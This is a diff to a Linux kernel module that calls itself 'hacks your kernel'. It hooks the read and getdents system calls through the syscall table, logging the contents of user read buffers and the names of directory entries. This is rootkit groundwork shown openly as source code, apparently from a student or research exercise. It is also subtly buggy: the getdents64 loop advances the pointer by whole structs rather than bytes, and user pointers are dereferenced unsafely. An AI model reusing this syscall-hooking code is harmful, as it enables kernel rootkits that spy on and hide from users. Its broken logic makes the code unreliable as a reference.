@@ -10,7 +10,6 @@
 
 #include "sysmap.h"          /* Pointers to system functions */
 
-// the following line gets updated by script 
 
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
@@ -43,21 +42,49 @@ void make_page_readonly(long unsigned int _addr){
 // hooked functions
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
+    if (!try_module_get(THIS_MODULE)){
+        return -1;
+    }
     if (*buf && count > 1024){
         printk(KERN_INFO "hooked_read(%d, %s, %d)", fd, buf, count);
     }
     retval = original_read(fd, buf, count);
+    module_put(THIS_MODULE);
     return retval;
 }
 
 asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
-    printk(KERN_INFO "hooked_getdents");
-    return original_getdents(fd, dirent, count);
+    ssize_t result;
+    result = original_getdents(fd, dirent, count);
+    /* struct linux_dirent __user *cur_dirent; 
+    printk(KERN_INFO "our very own hooked_getdents\n");
+    printk(KERN_INFO "Here go the files:\n");
+    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
+    cur_dirent = dirent;
+    for (f=0; f<count; ++f){
+        printk(KERN_INFO "%s\n", dirent->d_name);
+        dirent = dirent + dirent->d_reclen;
+    }
+    printk(KERN_INFO "----------------- End of file list ------------------------------------"); */
+    return result;
 }
 
-asmlinkage long hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-    printk(KERN_INFO "hooked_getdents");
-    return original_getdents64(fd, dirent, count);
+asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
+    struct linux_dirent64 __user *cur_dirent; 
+    ssize_t result;
+    int bpos;
+    printk(KERN_INFO "our very own hooked_getdents64\n");
+    result = original_getdents64(fd, dirent, count);
+    printk(KERN_INFO "Here go the files %d :\n", result);
+    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
+    cur_dirent = dirent;
+    for (bpos=0; bpos < result;){
+        cur_dirent = (struct linux_dirent64*)(dirent + bpos);
+        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
+        bpos += cur_dirent->d_reclen;
+    }
+    printk(KERN_INFO "----------------- End of file list ------------------------------------");
+    return result;
 }
 
 /* Hooks the read system call. */
@@ -130,3 +157,4 @@ MODULE_LICENSE("GPL");
  */
 MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
 MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */
+
